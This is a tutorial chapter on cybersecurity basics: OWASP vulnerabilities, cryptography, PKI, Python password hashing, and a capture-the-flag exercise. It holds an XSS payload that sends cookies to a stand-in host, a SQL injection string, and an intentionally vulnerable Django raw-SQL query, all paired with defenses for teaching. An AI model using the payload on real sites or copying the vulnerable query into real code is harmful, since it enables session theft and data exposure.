# 14. Cybersecurity: Red Team vs. Blue Team 🛡️

> "Security is not a product, it's a process." — Bruce Schneier

## 1. The Mindset

- **Red Team (Offense)**: "How can I break this? Where is the weakest link?"
- **Blue Team (Defense)**: "How can I detect an attack? How can I make breaking this cost-prohibitive?"

## 2. Common Vulnerabilities (OWASP Top 10)

### A. SQL Injection (SQLi)

- **Attack**: `user_input = "' OR '1'='1"`
- **Query**: `SELECT * FROM users WHERE name = '' OR '1'='1'` -> Returns ALL users.
- **Defense**: **Parameterized Queries** (Prepared Statements). The database treats input as data, not code.

### B. XSS (Cross-Site Scripting)

- **Attack**: Inject JavaScript into a webpage viewed by others. `<script>fetch('hacker.com?cookie='+document.cookie)</script>`
- **Defense**: **Content Security Policy (CSP)** headers. **Escape** all user output.

### C. CSRF (Cross-Site Request Forgery)

- **Attack**: A user is logged into your bank. They visit `evil.com`. `evil.com` sends a POST request to `yourbank.com/transfer` behind the scenes. Browser sends cookies automatically.
- **Defense**: **CSRF Tokens**. Random values that must accompany every state-changing request.

## 3. Cryptography 101

### Symmetric (AES)

- One key locks and unlocks.
- Fast.
- Problem: How do we share the key securely?

### Asymmetric (RSA/ECC)

- **Public Key**: Encrypts. (Give to everyone).
- **Private Key**: Decrypts. (Keep secret).
- **Signing**: Sign with Private, Verify with Public. (Prove identity).

### Hashing (SHA-256)

- One-way. Cannot reverse.
- **Salting**: Add random data to input before hashing to prevent Rainbow Table attacks.
- **Algorithms**: MD5 (Broken), SHA-1 (Broken), SHA-256 (Standard), Argon2 (Best for passwords).

## 4. HTTPS & PKI (Public Key Infrastructure)

How do you know `google.com` is really Google?

1.  **Certificate Authority (CA)** (e.g., Let's Encrypt) has a Root Certificate trusted by your OS.
2.  Google asks CA to sign their Public Key.
3.  Your browser verifies the signature using the Root Certificate.

## 5. Practical Python: Secure Password Handling

DO NOT invent your own crypto. Use libraries.

```python
import secrets
import hashlib
import hmac

def hash_password_securely(password: str) -> str:
    # 1. Generate a random salt (32 bytes)
    salt = secrets.token_hex(32)

    # 2. Hash using PBKDF2 (Password-Based Key Derivation Function 2)
    # Slows down brute-force attacks by iterating 100,000 times.
    key = hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt.encode('utf-8'),
        100000
    )

    # Store salt AND hash
    return f"{salt}${key.hex()}"

def verify_password(stored_string: str, input_password: str) -> bool:
    salt, stored_hash = stored_string.split('$')

    new_hash = hashlib.pbkdf2_hmac(
        'sha256',
        input_password.encode('utf-8'),
        salt.encode('utf-8'),
        100000
    ).hex()

    # Use compare_digest to prevent Timing Attacks
    return hmac.compare_digest(stored_hash, new_hash)

# Usage
db_entry = hash_password_securely("super_secret_123")
print("Authenticating:", verify_password(db_entry, "super_secret_123"))
```

## 6. Mini-Project: "Capture The Flag"

1. Create a Django view that executes raw SQL: `cursor.execute("SELECT * FROM courses WHERE name = '%s'" % name)`.
2. Attack it: use `' OR '1'='1` to dump the table.
3. Patch it: use `cursor.execute("SELECT * FROM courses WHERE name = %s", [name])`.
4. Verify the attack fails.
